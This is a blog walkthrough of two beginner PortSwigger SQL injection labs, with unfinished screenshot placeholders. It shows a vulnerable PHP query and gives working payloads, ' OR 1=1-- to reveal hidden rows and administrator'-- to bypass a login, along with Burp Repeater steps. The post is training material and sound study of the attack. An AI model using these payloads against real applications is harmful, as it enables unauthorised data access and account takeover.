---
title: "PortSwigger SQL Injection Labs — Part 1: Hidden Data & Login Bypass"
date: 2026-09-22 06:00:00 +0000
categories: [Web Penetration Testing]
tags: [SQL Injection, PortSwigger, Web Security Academy]
description: "Walkthrough of the two Apprentice SQL injection labs on PortSwigger Web Security Academy: retrieving hidden data and bypassing login."
author: Paschal Sangawe
toc: true
---

SQL injection (SQLi) is still one of the highest-impact bugs you can find in a web application. PortSwigger's Web Security Academy has a clean, progressive set of labs for it: **17 labs** in total (2 Apprentice, 15 Practitioner). I worked through all of them and this series documents every payload and the reasoning behind it.

This is a 5-part series, grouped by technique:

| Part | Topic | Labs |
|------|-------|------|
| **1** | Retrieving hidden data & login bypass | 1–2 |
| 2 | Examining the database (type, version, contents) | 3–6 |
| 3 | UNION-based extraction | 7–10 |
| 4 | Blind SQL injection | 11–16 |
| 5 | WAF bypass via XML encoding | 17 |

## Background

SQLi happens when user input is concatenated straight into a query instead of being passed as a bound parameter. A typical vulnerable pattern:

```php
$sql = "SELECT * FROM products WHERE category = '" . $_GET['category'] . "' AND released = 1";
```

Anything the user sends becomes part of the SQL grammar. When the value lands inside a string literal, a single quote (`'`) ends that literal and lets an attacker append their own SQL. A comment sequence (`-- ` for most databases, `#` for MySQL) removes whatever the developer appended afterwards.

Two useful primitives:

- `' OR 1=1-- ` — makes the `WHERE` clause always true.
- `administrator'-- ` — comments out the password check in a login query.

## Lab 1 — SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
> **Picture goes here (#1).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `SELECT * FROM products WHERE category = '<input>' AND released = 1`.
> _Save as_ `images/portswigger-sqli-part-1-basics/1.png` _then replace this block with_ `![Lab 1 — SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](/images/portswigger-sqli-part-1-basics/1.png)`_._


**Difficulty:** Apprentice
**Goal:** Display all products, including those that are unreleased.

The product category filter is placed directly into the query, so the query is effectively:

```sql
SELECT * FROM products WHERE category = '<input>' AND released = 1
```

> **Picture goes here (#2).** Capture this request/response or command step in Burp/terminal. Key line: `SELECT * FROM products WHERE category = '<input>' AND released = 1`.
> _Save as_ `images/portswigger-sqli-part-1-basics/2.png` _then replace this block with_ `![Lab 1 — SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](/images/portswigger-sqli-part-1-basics/2.png)`_._


The `released = 1` clause hides unreleased products.

**Payload** (in the `category` parameter):

```sql
'+OR+1=1--
```

> **Picture goes here (#3).** Capture this request/response or command step in Burp/terminal. Key line: `'+OR+1=1--`.
> _Save as_ `images/portswigger-sqli-part-1-basics/3.png` _then replace this block with_ `![Lab 1 — SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](/images/portswigger-sqli-part-1-basics/3.png)`_._


Decoded on the wire this is `' OR 1=1-- `. The resulting query becomes:

```sql
SELECT * FROM products WHERE category = '' OR 1=1-- ' AND released = 1
```

> **Picture goes here (#4).** Capture this request/response or command step in Burp/terminal. Key line: `SELECT * FROM products WHERE category = '' OR 1=1-- ' AND released = 1`.
> _Save as_ `images/portswigger-sqli-part-1-basics/4.png` _then replace this block with_ `![Lab 1 — SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](/images/portswigger-sqli-part-1-basics/4.png)`_._


Because `1=1` is always true, the `WHERE` clause matches every row, and the trailing `AND released = 1` is commented out. The response now lists unreleased products as well.

> **Picture goes here (#5).** Burp Repeater request with `category=Gifts'+OR+1=1--` and the response containing unreleased products.
> _Save as_ `images/portswigger-sqli-part-1-basics/5.png` _then replace this block with_ `![Lab 1 — SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](/images/portswigger-sqli-part-1-basics/5.png)`_._

**Steps**

1. Browse to a product category and intercept the request in Burp Suite (Proxy → Intercept).
2. Send the request to Repeater.
3. Change the `category` value to `'+OR+1=1--`.
4. Send it. The response contains products that were previously hidden.

## Lab 2 — SQL injection vulnerability allowing login bypass
> **Picture goes here (#6).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `SELECT * FROM users WHERE username = '<user>' AND password = '<pass>'`.
> _Save as_ `images/portswigger-sqli-part-1-basics/6.png` _then replace this block with_ `![Lab 2 — SQL injection vulnerability allowing login bypass](/images/portswigger-sqli-part-1-basics/6.png)`_._


**Difficulty:** Apprentice
**Goal:** Log in as the `administrator` user without knowing the password.

The login form builds a query like:

```sql
SELECT * FROM users WHERE username = '<user>' AND password = '<pass>'
```

> **Picture goes here (#7).** Capture this request/response or command step in Burp/terminal. Key line: `SELECT * FROM users WHERE username = '<user>' AND password = '<pass>'`.
> _Save as_ `images/portswigger-sqli-part-1-basics/7.png` _then replace this block with_ `![Lab 2 — SQL injection vulnerability allowing login bypass](/images/portswigger-sqli-part-1-basics/7.png)`_._


Because both fields are concatenated, we can comment out the password check entirely.

**Payload**

- Username: `administrator'--`
- Password: anything (leave blank)

The query becomes:

```sql
SELECT * FROM users WHERE username = 'administrator'-- ' AND password = ''
```

> **Picture goes here (#8).** Capture this request/response or command step in Burp/terminal. Key line: `SELECT * FROM users WHERE username = 'administrator'-- ' AND password = ''`.
> _Save as_ `images/portswigger-sqli-part-1-basics/8.png` _then replace this block with_ `![Lab 2 — SQL injection vulnerability allowing login bypass](/images/portswigger-sqli-part-1-basics/8.png)`_._


The `--` comments out the password condition, so the query returns the administrator row and we are logged in.

> **Picture goes here (#9).** Login request with username `administrator'--`, and the resulting "Your username is: administrator" account page.
> _Save as_ `images/portswigger-sqli-part-1-basics/9.png` _then replace this block with_ `![Lab 2 — SQL injection vulnerability allowing login bypass](/images/portswigger-sqli-part-1-basics/9.png)`_._

**Steps**

1. Go to **My account** and submit any credentials while intercepting the request.
2. In Repeater, set `username=administrator'--` and `password=` (empty).
3. Send the request. The application logs you in as administrator.

## Takeaways

- Always test string-context input with a single quote and watch for errors or response changes.
- `OR 1=1` and the comment sequence are the two fastest ways to prove a `WHERE`-clause injection.
- For login forms, `username'--` is usually the quickest win, because it removes the password comparison.

Next: [Part 2 — Examining the Database](/posts/portswigger-sqli-part-2-examining-the-database/), where we fingerprint the database and dump table and column names.
